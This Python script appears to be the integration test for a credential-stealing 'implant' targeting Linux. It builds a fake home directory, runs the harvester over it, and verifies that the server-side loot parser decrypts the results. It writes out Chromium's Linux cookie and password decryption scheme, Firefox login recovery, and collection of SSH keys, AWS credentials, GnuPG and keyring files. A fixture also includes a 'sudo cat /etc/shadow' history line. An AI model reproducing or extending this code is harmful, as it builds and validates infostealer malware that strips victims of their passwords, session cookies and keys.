"""Build a synthetic Linux home dir with realistic harvest targets, then run
the linux implant over it (--home) and verify the resulting container parses
and decrypts server-side. Runs cross-platform (tested under Windows python).

Chromium v10 blobs use the Linux scheme: PBKDF2-HMAC-SHA1(pw, 'saltysalt',
1 iter, 16 bytes) -> AES-128-CBC, IV = 16 spaces, PKCS7.
"""
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile

ROOT = os.path.dirname(os.path.abspath(__file__))
PROJ = os.path.dirname(ROOT)
sys.path.insert(0, os.path.join(PROJ, "server"))
sys.path.insert(0, ROOT)

import parse_loot as P  # noqa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # noqa
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC  # noqa
from cryptography.hazmat.primitives import hashes, padding  # noqa
import shcrypto  # noqa


def linux_v10_blob(password, plaintext):
    kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16, salt=b"saltysalt",
                     iterations=1)
    key = kdf.derive(password.encode())
    padder = padding.PKCS7(128).padder()
    pt = padder.update(plaintext) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(b" " * 16)).encryptor()
    return b"v10" + enc.update(pt) + enc.finalize()


def build_home(base):
    home = os.path.join(base, "fakehome")
    os.makedirs(home, exist_ok=True)

    # --- chromium: google-chrome with v10 (peanuts) cookies ---
    pd = os.path.join(home, ".config", "google-chrome", "Default", "Network")
    os.makedirs(pd)
    cdb = os.path.join(pd, "Cookies")
    db = sqlite3.connect(cdb)
    db.executescript("""CREATE TABLE cookies (
        host_key TEXT NOT NULL, name TEXT NOT NULL, value TEXT NOT NULL,
        path TEXT NOT NULL, expires_utc INTEGER NOT NULL, is_secure INTEGER,
        is_httponly INTEGER, encrypted_value BLOB);""")
    db.execute("INSERT INTO cookies VALUES (?,?,?,?,?,?,?,?)",
               (".linux-test.org", "session", "", "/", 99999999999999999, 1, 0,
                linux_v10_blob("peanuts", b"LINUXT0KEN-abc123")))
    db.commit()
    db.close()

    # --- chromium: brave with a keyring-password v10 blob ---
    bpd = os.path.join(home, ".config", "BraveSoftware", "Brave-Browser", "Default")
    os.makedirs(bpd)
    ldb = os.path.join(bpd, "Login Data")
    db = sqlite3.connect(ldb)
    db.executescript("""CREATE TABLE logins (origin_url TEXT, action_url TEXT,
        username_element TEXT, username_value TEXT, password_element TEXT,
        password_value BLOB, date_created INTEGER);""")
    db.execute("INSERT INTO logins VALUES (?,?,?,?,?,?,?)",
               ("https://brave.test/login", "https://brave.test/do", "u",
                "linuxuser", "p",
                linux_v10_blob("k3yr1ng-Sup3rPw", b"BravePw99!"), 1))
    db.commit()
    db.close()

    # --- firefox classic (reuse the synth_firefox generator) ---
    from synth_firefox import make_pbes2, make_key4, make_logins_json
    import base64 as b64
    gs = os.urandom(20)
    import os as _os
    k24 = _os.urandom(24)
    check = make_pbes2(gs, _os.urandom(32), b"password-check")
    a11 = make_pbes2(gs, _os.urandom(32), k24)
    _, k4b = make_key4(gs, check, a11)
    ffd = os.path.join(home, ".mozilla", "firefox", "fx1.default-release")
    os.makedirs(ffd)
    with open(os.path.join(ffd, "key4.db"), "wb") as f:
        f.write(k4b)
    with open(os.path.join(ffd, "logins.json"), "wb") as f:
        f.write(make_logins_json(k24, [("https://ff.test", "tux", "PenguinPass1!")]))

    # --- ssh / aws / gnupg / keyring / history ---
    sshd = os.path.join(home, ".ssh")
    os.makedirs(sshd)
    with open(os.path.join(sshd, "id_rsa"), "w") as f:
        f.write("-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEKEYMATERIAL\n"
                "-----END OPENSSH PRIVATE KEY-----\n")
    aws = os.path.join(home, ".aws")
    os.makedirs(aws)
    with open(os.path.join(aws, "credentials"), "w") as f:
        f.write("[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
                "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n")
    gpg = os.path.join(home, ".gnupg", "private-keys-v1.d")
    os.makedirs(gpg)
    with open(os.path.join(gpg, "ABC.key"), "wb") as f:
        f.write(os.urandom(64))
    krd = os.path.join(home, ".local", "share", "keyring")
    os.makedirs(krd)
    with open(os.path.join(krd, "default.keyring"), "wb") as f:
        f.write(b"GNOME_KEYRING_FORMAT" + os.urandom(128))
    with open(os.path.join(home, ".bash_history"), "w") as f:
        f.write("ls -la\nssh root@10.0.0.1\nsudo cat /etc/shadow\n")

    # brave keyring password (what secret-tool would have returned)
    with open(os.path.join(bpd, "linux_password"), "w") as f:
        f.write("k3yr1ng-Sup3rPw")
    return home


def main():
    base = tempfile.mkdtemp(prefix="sh_linux_")
    home = build_home(base)

    # run the implant against the fake home (move keyring pw where the implant
    # would look: emulate secret-tool by pre-providing is not supported in
    # --home mode, so we run once and then inject the password part manually
    # for brave decryption server-side)
    out = os.path.join(base, "out.bin")
    r = subprocess.run([sys.executable, os.path.join(PROJ, "linux", "sh_harvest.py"),
                        "--home", home, "--out", out, "-v"],
                       capture_output=True, text=True)
    print(r.stderr.strip())
    assert r.returncode == 0, "implant run failed rc=%d" % r.returncode
    assert os.path.exists(out)

    manifest, parts = shcrypto.unpack(open(out, "rb").read(), b"dev-psk-change-me")
    assert manifest["victim"]["platform"] == "linux"
    print("\nparts collected:", sorted(parts.keys()))

    # emulate the secret-tool part for brave (as it would come from a real
    # desktop session with the keyring unlocked)
    parts["b:brave/linux_password"] = open(
        os.path.join(home, ".config", "BraveSoftware", "Brave-Browser",
                     "Default", "linux_password"), "rb").read()

    report = []
    creds = {"victim": manifest["victim"]}
    P.COOKIE_DIR = base
    P.parse_chromium(parts, report, creds)
    P.parse_firefox(parts, report, creds)
    P.parse_linux(parts, report, creds)
    print("\n".join(report))

    ck = [c for c in creds.get("cookies", []) if c["decrypted"]]
    assert any(c["value"] == "LINUXT0KEN-abc123" for c in ck), "chrome linux v10 cookie failed"
    pw = [p for p in creds.get("passwords", []) if p.get("decrypted")]
    assert any(p["password"] == "BravePw99!" and p["user"] == "linuxuser" for p in pw), "brave keyring v10 login failed"
    assert any(p["password"] == "PenguinPass1!" for p in creds["passwords"]), "firefox login failed"
    assert any("id_rsa" in k for k in creds.get("private_keys", [])), "ssh key not flagged"
    assert any("AKIAIOSFODNN7EXAMPLE" in c.get("content", "")
               for c in creds.get("cloud", [])), "aws creds missing"
    print("\nlinux roundtrip OK: chrome v10(peanuts) + brave v10(keyring) + "
          "firefox + ssh + aws all recovered")


if __name__ == "__main__":
    main()
